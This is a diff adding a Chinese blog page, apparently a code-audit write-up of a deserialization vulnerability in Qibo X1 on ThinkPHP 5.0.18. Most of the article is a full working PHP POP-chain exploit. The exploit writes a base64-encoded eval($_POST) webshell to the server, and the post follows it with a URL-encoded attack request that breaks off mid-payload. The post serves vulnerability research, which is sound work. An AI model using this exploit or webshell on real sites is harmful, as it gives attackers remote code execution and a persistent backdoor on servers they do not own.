@@ -1,0 +1,454 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sp4z">
+  <meta name="keywords" content="">
+  
+  <title>代码审计：齐博X1反序列化漏洞 - sp4z&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="代码审计：齐博X1反序列化漏洞">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-29 20:15" pubdate>
+        2021年8月29日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      21
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">代码审计：齐博X1反序列化漏洞</h1>
+            
+            <div class="markdown-body">
+              <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>/application/member/controller/Msg.php</p>
+<p>listqun方法直接将可控参数传入unserialize，造成反序列化漏洞，程序基于thinkphp5.0.18开发，配合thinkphp反序列化利用链即可实现RCE</p>
+<p><a href="https://imgtu.com/i/hGoCrj"><img src="https://z3.ax1x.com/2021/08/29/hGoCrj.png" srcset="/img/loading.gif" lazyload alt="hGoCrj.png"></a></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h2><p>下载源码：<a href="http://www.php168.com/x1.zip">www.php168.com/x1.zip</a></p>
+<p>在本地搭建环境</p>
+<p>先在前台注册一个用户</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/index.php/i</span>ndex<span class="hljs-regexp">/reg/i</span>ndex.html<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/hGoPqs"><img src="https://z3.ax1x.com/2021/08/29/hGoPqs.png" srcset="/img/loading.gif" lazyload alt="hGoPqs.png"></a></p>
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Windows</span> &#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">files</span> = [];<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$files</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;files = [<span class="hljs-variable">$files</span>]; <span class="hljs-comment">//$file =&gt; /think/Model的子类new Pivot(); Model是抽象类</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span> &#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Model</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$error</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$parent</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$output</span>, <span class="hljs-variable">$modelRelation</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;parent = <span class="hljs-variable">$output</span>;  <span class="hljs-comment">//$this-&gt;parent=&gt; think\console\Output;</span><br>            <span class="hljs-keyword">$this</span>-&gt;append = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;xxx&quot;</span>=&gt;<span class="hljs-string">&quot;getError&quot;</span>);     <span class="hljs-comment">//调用getError 返回this-&gt;error</span><br>            <span class="hljs-keyword">$this</span>-&gt;error = <span class="hljs-variable">$modelRelation</span>;               <span class="hljs-comment">// $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$output</span>, <span class="hljs-variable">$modelRelation</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-built_in">parent</span>::__construct(<span class="hljs-variable">$output</span>, <span class="hljs-variable">$modelRelation</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">HasOne</span> <span class="hljs-title">extends</span> <span class="hljs-title">OneToOne</span> &#123;<br><br>    &#125;<br>&#125;<br><span class="hljs-title">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span> &#123;<br>    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">OneToOne</span><br>    &#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">selfRelation</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindAttr</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$query</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;selfRelation = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;query = <span class="hljs-variable">$query</span>;    <span class="hljs-comment">//$query指向Query</span><br>            <span class="hljs-keyword">$this</span>-&gt;bindAttr = [<span class="hljs-string">&#x27;xxx&#x27;</span>];<span class="hljs-comment">// $value值，作为call函数引用的第二变量</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Query</span> &#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">model</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$model</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;model = <span class="hljs-variable">$model</span>; <span class="hljs-comment">//$this-&gt;model=&gt; think\console\Output;</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Output</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">handle</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$styles</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$handle</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;styles = [<span class="hljs-string">&#x27;getAttr&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;handle =<span class="hljs-variable">$handle</span>; <span class="hljs-comment">//$handle-&gt;think\session\driver\Memcached</span><br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Memcached</span><br>    &#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">handler</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$handle</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;handler = <span class="hljs-variable">$handle</span>; <span class="hljs-comment">//$handle-&gt;think\cache\driver\File</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">File</span><br>    &#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">options</span>=<span class="hljs-title">null</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tag</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;options=[<br>                <span class="hljs-string">&#x27;expire&#x27;</span> =&gt; <span class="hljs-number">3600</span>,<br>                <span class="hljs-string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>                <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>                <span class="hljs-string">&#x27;path&#x27;</span>  =&gt; <span class="hljs-string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;</span>,<br>                <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>            ];<br>            <span class="hljs-keyword">$this</span>-&gt;tag = <span class="hljs-string">&#x27;xxx&#x27;</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    $<span class="hljs-title">Memcached</span> = <span class="hljs-title">new</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">Memcached</span>(<span class="hljs-title">new</span> \<span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">File</span>());<br>    <span class="hljs-variable">$Output</span> = <span class="hljs-keyword">new</span> think\console\Output(<span class="hljs-variable">$Memcached</span>);<br>    <span class="hljs-variable">$model</span> = <span class="hljs-keyword">new</span> think\db\Query(<span class="hljs-variable">$Output</span>);<br>    <span class="hljs-variable">$HasOne</span> = <span class="hljs-keyword">new</span> think\model\relation\HasOne(<span class="hljs-variable">$model</span>);<br>    <span class="hljs-variable">$window</span> = <span class="hljs-keyword">new</span> think\process\pipes\Windows(<span class="hljs-keyword">new</span> think\model\Pivot(<span class="hljs-variable">$Output</span>,<span class="hljs-variable">$HasOne</span>));<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$window</span>));<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>运行exp，生成payload</p>
+<p><a href="https://imgtu.com/i/hGo9MQ"><img src="https://z3.ax1x.com/2021/08/29/hGo9MQ.png" srcset="/img/loading.gif" lazyload alt="hGo9MQ.png"></a></p>
+<p>发送payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/member.php/member/Msg/listqun?config[cfg]=O%<span class="hljs-number">3</span>A<span class="hljs-number">27</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cprocess%<span class="hljs-number">5</span>Cpipes%<span class="hljs-number">5</span>CWindows%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">34</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>Cprocess%<span class="hljs-number">5</span>Cpipes%<span class="hljs-number">5</span>CWindows%<span class="hljs-number">00</span>files%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>CPivot%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>append%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>getError%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>error%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">27</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cmodel%<span class="hljs-number">5</span>Crelation%<span class="hljs-number">5</span>CHasOne%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">15</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>selfRelation%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">11</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>bindAttr%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>query%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">14</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cdb%<span class="hljs-number">5</span>CQuery%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>model%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">20</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Cconsole%<span class="hljs-number">5</span>COutput%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">28</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>think%<span class="hljs-number">5</span>Cconsole%<span class="hljs-number">5</span>COutput%<span class="hljs-number">00</span>handle%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">30</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Csession%<span class="hljs-number">5</span>Cdriver%<span class="hljs-number">5</span>CMemcached%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">10</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>handler%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A<span class="hljs-number">23</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>think%<span class="hljs-number">5</span>Ccache%<span class="hljs-number">5</span>Cdriver%<span class="hljs-number">5</span>CFile%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">10</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>options%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">5</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>expire%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">3600</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">12</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cache_subdir%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>prefix%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>path%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">122</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>php%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Ffilter%<span class="hljs-number">2</span>Fconvert.iconv.utf-<span class="hljs-number">8</span>.utf-<span class="hljs-number">7</span>%<span class="hljs-number">7</span>Cconvert.base<span class="hljs-number">64</span>-decode%<span class="hljs-number">2</span>Fresource%<span class="hljs-number">3</span>DaaaPD<span class="hljs-number">9</span>waHAgQGV<span class="hljs-number">2</span>YWwoJF<span class="hljs-number">9</span>QT<span class="hljs-number">1</span>NUWydjY<span class="hljs-number">2</span>MnXSk<span class="hljs-number">7</span>Pz<span class="hljs-number">4</span>g%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>Fa.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">13</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>data_compress%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">6</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>tag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">3</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xxx%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span 